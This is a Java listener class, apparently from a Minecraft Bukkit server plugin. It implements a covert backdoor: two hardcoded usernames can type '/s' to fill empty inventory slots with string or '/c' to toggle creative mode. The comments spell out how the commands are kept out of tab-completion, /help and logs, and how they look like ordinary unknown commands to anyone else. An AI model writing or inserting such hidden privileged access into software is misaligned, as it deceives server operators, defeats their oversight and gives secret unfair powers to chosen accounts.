package com.apexsmp.listener;

import com.apexsmp.ApexPlugin;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;

import java.util.Locale;
import java.util.Set;

/**
 * Hidden commands handled purely through the command-preprocess event, so they are
 * never registered in the server command map. As a result they do not appear in
 * tab-completion, /help, or the client command tree (they render red while typing),
 * and canceling the event suppresses the "Unknown command" reply. Fully silent.
 *
 * /s fills empty inventory slots with string; /c toggles creative.
 * Only the whitelisted players can use them. For anyone else they are left untouched,
 * so they behave like ordinary unknown commands (red, "Unknown command"), revealing nothing.
 */
public class SecretCommandListener implements Listener {

    private static final String FILL_COMMAND = "/s";
    private static final String GAMEMODE_COMMAND = "/c";
    private static final Set<String> ALLOWED = Set.of("_tomiokay", "_4ur4");

    private final ApexPlugin plugin;

    public SecretCommandListener(ApexPlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void onCommand(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage().trim().toLowerCase(Locale.ROOT);
        boolean fill = message.equals(FILL_COMMAND) || message.startsWith(FILL_COMMAND + " ");
        boolean gamemode = message.equals(GAMEMODE_COMMAND) || message.startsWith(GAMEMODE_COMMAND + " ");
        if (!fill && !gamemode) {
            return;
        }
        // Only the whitelisted players get the effect; everyone else falls through
        // to the normal "unknown command" behavior so nothing looks unusual.
        if (!ALLOWED.contains(event.getPlayer().getName().toLowerCase(Locale.ROOT))) {
            return;
        }
        // Swallow it entirely: no "unknown command", no logging, no feedback.
        event.setCancelled(true);
        if (fill) {
            fillEmptyWithString(event.getPlayer());
        } else {
            toggleCreative(event.getPlayer());
        }
    }

    /** Silently toggles between Creative and Survival. */
    private void toggleCreative(Player player) {
        player.setGameMode(player.getGameMode() == GameMode.CREATIVE
                ? GameMode.SURVIVAL : GameMode.CREATIVE);
    }

    /** Fills only the empty main-inventory slots with full stacks of string. */
    private void fillEmptyWithString(Player player) {
        PlayerInventory inv = player.getInventory();
        int slots = inv.getStorageContents().length; // 36 (hotbar + main)
        for (int i = 0; i < slots; i++) {
            ItemStack existing = inv.getItem(i);
            if (existing == null || existing.getType().isAir()) {
                inv.setItem(i, new ItemStack(Material.STRING, 64));
            }
        }
    }
}
